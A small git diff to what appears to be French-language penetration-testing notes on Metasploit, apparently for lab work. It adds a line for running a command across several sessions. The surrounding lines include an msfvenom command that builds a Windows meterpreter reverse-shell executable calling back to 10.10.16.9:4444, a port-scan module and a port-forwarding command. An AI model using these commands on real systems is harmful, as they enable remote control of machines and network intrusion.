@@ -336,6 +336,7 @@ allow-hotplug eth0
   	- Créer un exe --> `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.9 LPORT=4444 -f exe -o meterpreter_payload.exe`
   	- Scanner une machine/réseau --> `use auxiliary/scanner/portscan/tcp`
   	- Port Forwarding --> `portfwd add -L 127.0.0.1 -l 53 -p 53 -r 172.16.2.5`
+  	- Excuter une commande sur plusieurs sessisions --> `sessions -c 'pwd' 42-45`
 
  - Boite à outils RedTeam --> https://arttoolkit.github.io/
 
